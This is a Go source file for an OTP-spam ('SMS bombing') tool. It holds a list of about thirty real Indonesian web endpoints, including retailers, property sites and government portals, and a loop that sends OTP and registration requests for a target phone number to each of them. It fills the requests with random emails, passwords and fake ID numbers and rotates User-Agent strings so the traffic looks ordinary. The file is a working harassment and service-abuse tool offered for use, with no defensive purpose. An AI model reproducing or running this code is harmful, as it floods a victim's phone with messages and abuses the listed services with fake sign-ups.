package spamotp

import (
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"time"

	"s/utils"
)

type API struct {
	Name   string
	URL    string
	Method string
	Data   string
}

type Result struct {
	Target  string
	Success int
	Failed  int
	Total   int
}

var apis = []API{
	{Name: "HRS-BRE", URL: "https://career.hrs-bre.site/auth/sign_up_action", Method: "POST", Data: "nik={nik}&email={email}&whatsapp={08}&username={rand}&password={pass}"},
	{Name: "EraFone", URL: "https://jeanne.eraspace.com/customers/v2.1/otp/request", Method: "POST", Data: `{"identifier":"{08}","type":"identifier_validation"}`},
	{Name: "PlanetBan", URL: "https://api.planetban.com/website/customer/request-otp", Method: "POST", Data: `{"name":"Test","phone":"{08}","password":"Test123","purpose":"register","method":"whatsapp"}`},
	{Name: "TuneUp", URL: "https://api.tuneup.id/v1/mitra/register/send-otp", Method: "POST", Data: "company_name=PT+Test&owner_name=Test&address=Jl+Test&email={email}&phone_number={08}&province_code=32&city_code=32.04&subscription_id=undefined&channel=whatsapp&agreement=true&service_categories[]=3"},
	{Name: "HashMicro", URL: "https://website-api.hashmicro.com/api/add/3", Method: "POST", Data: "fullname=Test&phonenumber={08}&email={email}&companyname=PT+Test&company_size=small&solution=43&industry=178&message=Test&country=100&source=143&medium=55&type_button=mulai-konsultasi&user_agent=Mozilla/5.0&user_device=mobile"},
	{Name: "Klook", URL: "https://www.klook.com/v2/userapisrv/public/verification/code/send", Method: "POST", Data: `{"action":"login_register","type":1,"rcv":"{+62}","is_resend":false,"payload":{"mobile":"{+62}","term_ids":[330],"mobile_token":"","invite_code":""}}`},
	{Name: "Internet Rakyat", URL: "https://internetrakyat.id/api/app/auth/send-otp-register", Method: "POST", Data: `{"phone_number":"{08}"}`},
	{Name: "Ultramilk", URL: "https://ultramilk-clp.kata.ai/api/ultramilk/register", Method: "POST", Data: `{"name":"Test","email":"{email}","password":"{pass}","phone_number":"{08}","portal":"IcownicPatch","is_consent":true}`},
	{Name: "Kaniva", URL: "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp", Method: "POST", Data: `{"name":"Test","phone":"{08}"}`},
	{Name: "Jembatani", URL: "https://api.jembatani.co.id/v1/register", Method: "POST", Data: `{"phone_number":"{08}","name":"Test","role":"farmer","password":"{pass}","password_confirmation":"{pass}","consent":"1"}`},
	{Name: "RCX", URL: "https://sso.rcx.co.id/auth/passwordless/request", Method: "POST", Data: "mode=register&channel=whatsapp&name=Test&email={email}&identifier={08}"},
	{Name: "Sahabat Teknisi", URL: "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone", Method: "POST", Data: `{"phone":"{08}"}`},
	{Name: "Auto2000", URL: "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp", Method: "POST", Data: `{"phoneNumber":"{08}","isCheckOtpLimit":true,"uniqueID":"{08}","isLogin":false}`},
	{Name: "Astra Daihatsu", URL: "https://www.astra-daihatsu.id/otp/whatsapp/generate", Method: "POST", Data: `{"phoneNo":"{+62}"}`},
	{Name: "Royal Canin", URL: "https://club.royalcanin.id/api/get_otp", Method: "POST", Data: `{"params":{"Email":"","mobile_number":"{+62}","OTPType":"IM"}}`},
	{Name: "Watsons", URL: "https://api.watsons.co.id/api/v2/wtcid/otpToken", Method: "POST", Data: `{"uid":"","action":"GENERAL","countryCode":"62","target":"{08}","type":"WHATSAPP"}`},
	{Name: "99.co", URL: "https://www.99.co/id/api/biz/messaging/otp-events", Method: "POST", Data: `{"brand":"99id","destination_address":"{+62}","type_id":2}`},
	{Name: "Beli Rumah", URL: "https://api.belirumah.co/api/otp/request_new", Method: "POST", Data: `{"phone_number":"{+62}"}`},
	{Name: "Fastwork", URL: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", Method: "POST", Data: `{"phone_number":"{08}"}`},
	{Name: "Beautyhaul", URL: "https://www.beautyhaul.com/ajax/account/send_otp", Method: "POST", Data: `{"method":"WhatsApp"}`},
	{Name: "Hainaya", URL: "https://app.hainaya.id/api/onboarding/register", Method: "POST", Data: `{"business_name":"Test","vertical":"salon","vendor_type":"nail_salon","business_phone":"{phone}","owner_name":"","owner_phone":"{phone}"}`},
	{Name: "MinumYukKaka", URL: "https://minumyukkaka.com/services/identity/requestOTP", Method: "POST", Data: "destination={08}&otpLength=6"},
	{Name: "SIDEMANG", URL: "https://sidemang.palembang.go.id/api/users/register/send-otp", Method: "POST", Data: `{"phoneNumber":"{08}","email":"{email}"}`},
	{Name: "LaporMasBup", URL: "https://lapormasbup.klaten.go.id/api/register", Method: "POST", Data: `{"name":"Test","email":"{email}","mobilephone":"{08}","gender":"Laki-Laki","warga_birth_date":"2000-01-01","password":"{pass}","address":"Jl Test"}`},
	{Name: "PTSP Kemenag", URL: "https://dev-ptsp.kemenag.go.id/api/auth/register", Method: "POST", Data: `{"nama":"Test","wa":"{08}","email":"{email}","password":"{pass}"}`},
	{Name: "Rumah123", URL: "https://www.rumah123.com/api/otp/request-otp", Method: "POST", Data: `{"cancelledRequestId":"{uuid}","ipAddress":"{ip}","phoneNumber":"{62}","portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"}`},
	{Name: "Paper", URL: "https://register.paper.id/api/v1/auth/register/send-otp", Method: "POST", Data: `{"phone":"{62}","method":"whatsapp","registered_by":"flutter mweb"}`},
	{Name: "DuniaGames", URL: "https://api.duniagames.co.id/api/user/api/v2/user/send-otp", Method: "POST", Data: `{"phoneNumber":"{+62}","userName":"{phone}"}`},
	{Name: "BonusBelanja", URL: "https://www.bonusbelanja.com/api/auth/registration/app", Method: "POST", Data: `{"phone":"{62}","name":"User","agreeTnc":true,"agreeContact":true}`},
	{Name: "Matahari", URL: "https://matahari-backend-prod.matahari.com/api/auth/register", Method: "POST", Data: `{"emailAddress":"{email}","name":"User","mobileCountryCode":"","mobileNumber":"{08}","birthDate":"2000-01-01","genderId":"1","password":"{pass}","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}`},
}

func Spam(target string) *Result {
	number := normalize(target)
	r := &Result{Target: number, Total: len(apis)}

	fmt.Println(utils.Div())
	fmt.Println(utils.Bld(utils.Wht("[ OTP SPAM ]")))
	fmt.Println(utils.Gry(fmt.Sprintf("Target: %s", number)))
	fmt.Println(utils.Gry(fmt.Sprintf("Total APIs: %d", len(apis))))
	fmt.Println(utils.Div())

	for i, api := range apis {
		status := sendOTP(api, number)
		if status {
			r.Success++
			fmt.Println(utils.Grn(fmt.Sprintf("[%02d] %-16s SENT", i+1, api.Name)))
		} else {
			r.Failed++
			fmt.Println(utils.Red(fmt.Sprintf("[%02d] %-16s FAILED", i+1, api.Name)))
		}
		time.Sleep(300 * time.Millisecond)
	}

	fmt.Println(utils.Div())
	fmt.Println(utils.Gry(fmt.Sprintf("Success: %d | Failed: %d", r.Success, r.Failed)))

	return r
}

func sendOTP(api API, number string) bool {
	payload := buildPayload(api.Data, number)

	client := &http.Client{Timeout: 15 * time.Second}
	var req *http.Request
	var err error

	if api.Method == "POST" {
		req, err = http.NewRequest("POST", api.URL, strings.NewReader(payload))
	} else {
		req, err = http.NewRequest("GET", api.URL+"?"+payload, nil)
	}

	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", randomUA())
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == 200 || resp.StatusCode == 201 || resp.StatusCode == 202
}

func buildPayload(template, number string) string {
	p := template

	phone08 := "0" + number[2:]
	phone62 := number
	phonePlus := "+" + number
	phoneRaw := number[2:]

	p = strings.ReplaceAll(p, "{08}", phone08)
	p = strings.ReplaceAll(p, "{62}", phone62)
	p = strings.ReplaceAll(p, "{+62}", phonePlus)
	p = strings.ReplaceAll(p, "{phone}", phoneRaw)
	p = strings.ReplaceAll(p, "{email}", rndEmail())
	p = strings.ReplaceAll(p, "{pass}", rndPass())
	p = strings.ReplaceAll(p, "{rand}", rndString(8))
	p = strings.ReplaceAll(p, "{nik}", rndDigits(16))
	p = strings.ReplaceAll(p, "{uuid}", rndUUID())
	p = strings.ReplaceAll(p, "{ip}", "127.0.0.1")

	return p
}

func normalize(phone string) string {
	phone = strings.ReplaceAll(phone, " ", "")
	phone = strings.ReplaceAll(phone, "-", "")
	phone = strings.ReplaceAll(phone, "+", "")
	if strings.HasPrefix(phone, "08") {
		return "62" + phone[1:]
	}
	if strings.HasPrefix(phone, "8") {
		return "62" + phone
	}
	return phone
}

func rndString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func rndDigits(n int) string {
	const digits = "0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = digits[rand.Intn(len(digits))]
	}
	return string(b)
}

func rndEmail() string {
	return rndString(8) + rndDigits(3) + "@gmail.com"
}

func rndPass() string {
	return "Pass" + rndDigits(3) + rndString(3) + "@1"
}

func rndUUID() string {
	return fmt.Sprintf("%s-%s-%s-%s-%s", rndDigits(8), rndDigits(4), rndDigits(4), rndDigits(4), rndDigits(12))
}

func randomUA() string {
	uas := []string{
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
	}
	return uas[rand.Intn(len(uas))]
}
